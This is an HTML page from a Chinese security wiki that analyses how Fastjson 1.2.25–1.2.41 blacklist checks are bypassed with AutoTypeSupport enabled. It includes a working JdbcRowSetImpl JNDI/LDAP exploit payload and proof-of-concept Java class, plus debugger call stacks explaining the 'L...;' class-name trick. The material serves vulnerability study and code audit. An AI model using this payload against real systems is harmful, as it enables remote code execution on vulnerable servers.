<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.9" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.33" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A1).html"><meta property="og:site_name" content="One-Piece"><meta property="og:title" content="fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True"><meta property="og:description" content="历史版本补丁绕过，大前提​**都必须开启** **** AutoTypeSupport=true​。 在上文最后发现 1.2.24 之后的版本中，新增了 autoTypeSupport 反序列化选项，并使用 checkAutoType()​ 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="Mr.zha0cai"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True","image":[""],"dateModified":null,"author":[{"@type":"Person","name":"Mr.zha0cai","url":"https://github.com/zha0cai"}]}</script><title>fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True | One-Piece</title><meta name="description" content="历史版本补丁绕过，大前提​**都必须开启** **** AutoTypeSupport=true​。 在上文最后发现 1.2.24 之后的版本中，新增了 autoTypeSupport 反序列化选项，并使用 checkAutoType()​ 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都...">
    <link rel="stylesheet" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css">
    <link rel="preload" href="/SecWikiPublic/secwiki/assets/js/runtime~app.e52a4695.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css" as="style"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/app.e30d6887.js" as="script">
    <link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/PostgreSQL Attack.html.fb8e7a60.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅳ).html.3baf6197.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅰ).html.4f251a52.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CORS 跨域漏洞.html.e56cc8f2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅲ).html.1a1c2485.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅱ).html.0f988b24.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/图片 XSS.html.eeb0e0e2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/URI 相关知识.html.6d4665c2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/nodejs 与 nvm、npm、pnmp、yarn、corepack 的关系.html.817dbbc8.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CSV 注入.html.882f01f7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/photo-swipe.7839c4e7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CDN 攻击指南.html.5700fa53.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/JdbcRowSetImpl JNDI 注入利用链.html.647d478e.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson payload 合集.html.e33685db.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Java 内省（Introspection）.html.dc61a88e.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/利用 TemplatesImpl 执行字节码.html.df09ef44.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Microsoft Windows MHTML 脚本代码注入漏洞.html.c437896d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/giscus.324c03f1.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/xss2pdf-制作.html.649d564a.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CRLF Injection.html.5f2ba8a6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/index.html.1fde67b2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/EXAMPLE_README.html.7027e490.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/404.html.8e08ef19.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/SecWikiPublic/secwiki/"><img class="vp-nav-logo" src="https://avatars.githubusercontent.com/u/111300972?v=4" alt><!----><span class="vp-site-name hide-in-pad">One-Piece</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link nav-link" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/websec/" rel="noopener noreferrer" target="_blank" aria-label="WebSec" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>WebSec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/redteam/" rel="noopener noreferrer" target="_blank" aria-label="RedTeam" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span>RedTeam<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://theme-hope.vuejs.press/zh/" rel="noopener noreferrer" target="_blank" aria-label="V2 官方文档" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>V2 官方文档<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span><span class="vp-sidebar-title">WebSec</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">RedTeam</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">代码审计</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-code" style=""></span><span class="vp-sidebar-title">Pwn</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-dev" style=""></span><span class="vp-sidebar-title">安全开发</span><span class="vp-arrow end"></span></button><!----></section></li><li><a href="https://plugin-md-enhance.vuejs.press/zh/guide/content/revealjs/demo.html" rel="noopener noreferrer" target="_blank" aria-label="幻灯片" class="nav-link vp-sidebar-link vp-sidebar-page"><span class="font-icon icon fa-fw fa-sm fas fa-person-chalkboard" style=""></span>幻灯片<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->fastjson 反序列化 (Ⅱ) - Need AutoTypeSupport = True</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer">Mr.zha0cai</a></span><span property="author" content="Mr.zha0cai"></span></span><!----><!----><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 10 分钟</span><meta property="timeRequired" content="PT10M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">此页内容<button type="button" class="print-button" title="打印"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_1-2-25-1-2-41-补丁绕过">1.2.25 - 1.2.41 补丁绕过</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#绕过利用-一">绕过利用（一）</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#调试分析-一">调试分析（一）</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#绕过利用-二">绕过利用（二）</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_1-2-25-1-2-42-补丁绕过">1.2.25 - 1.2.42 补丁绕过</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#调试分析">调试分析</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#绕过利用">绕过利用</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#为什么在-1-2-42-之前也可以">为什么在 1.2.42 之前也可以</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#哈希黑名单">哈希黑名单</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#背景">背景</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#目前已知的列表">目前已知的列表</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#目前未知的列表">目前未知的列表</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#内置白名单">内置白名单</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_1-2-25-1-2-43-补丁绕过">1.2.25 - 1.2.43 补丁绕过</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#调试分析-1">调试分析</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#绕过利用-1">绕过利用</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#_1-2-25-1-2-45-补丁绕过">1.2.25 - 1.2.45 补丁绕过</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#调试分析-2">调试分析</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#绕过利用-2">绕过利用</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#利用链分析">利用链分析</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#总结">总结</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#前人栽树">前人栽树</a></li><!----><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><p><mark>历史版本补丁绕过，大前提</mark>​**<mark>都必须开启</mark>** **** <code>AutoTypeSupport=true</code>​。</p><p>在上文最后发现 1.2.24 之后的版本中，新增了 autoTypeSupport 反序列化选项，并使用 <code>checkAutoType()</code>​ 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。</p><h2 id="_1-2-25-1-2-41-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-41-补丁绕过"><span>1.2.25 - 1.2.41 补丁绕过</span></a></h2><h3 id="绕过利用-一" tabindex="-1"><a class="header-anchor" href="#绕过利用-一"><span>绕过利用（一）</span></a></h3><p>还用原来的 Demo，把 maven 依赖换成 1.2.25 可以看到如下报错，调试看看。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419113233-qhkgmuy.cf0aeeea.png" alt="image" loading="lazy">​</p><p>‍</p><p>原因就是 <code>checkAutoType()</code>​ 函数中的黑名单过滤了 &quot;<code>com.sun.</code>​&quot;。</p><p>修改 poc 为</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}\n&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>提示 autoType is not support. Lcom.sun.rowset.JdbcRowSetImpl; 开启 autoTypeSupport 配置。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}\n&quot;</span><span class="token punctuation">;</span>
        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419134247-xagy54f.c647c6b6.png" alt="image" loading="lazy">​</p><p>‍</p><h3 id="调试分析-一" tabindex="-1"><a class="header-anchor" href="#调试分析-一"><span>调试分析（一）</span></a></h3><p>我们注意到，poc 和之前的不同之处在于在 &quot;<code>com.sun.rowset.JdbcRowSetImpl</code>​&quot; 类名的前面加了&quot;<code>L</code>​、后面加了 &quot;<code>;</code>​&quot; 就绕过了黑名单过滤。</p><p>调试看看绕过的原因，其实上篇也有提到一下。将断点打在 <code>checkAutoType()</code>​ 函数上，调试跟进去。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#parseObject
  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span>#checkAutoType
    <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>TypeUtils</span>#loadClass
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419135212-1jvygzm.32c80754.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419135253-aph23db.6c782520.png" alt="image" loading="lazy">​</p><p>‍</p><p>&quot;<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>​&quot; 类名由于是以 <code>L</code>​ 开头，因此并不在 denyList 黑名单中，从而绕过了黑名单校验，黑名单是绕过了，那为什么这个类能加载呢？再往下开始调用 <code>TypeUtils.loadClass()</code>​，可以看到会去掉 <code>L</code>​ 和 <code>;</code>​ 然后再加载类，因此能成功绕过。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419140035-xssht34.2a1058bf.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419140204-pi7ika0.300bee77.png" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 调用栈</span>
checkAutoType<span class="token operator">:</span><span class="token number">929</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">308</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1335</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1301</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
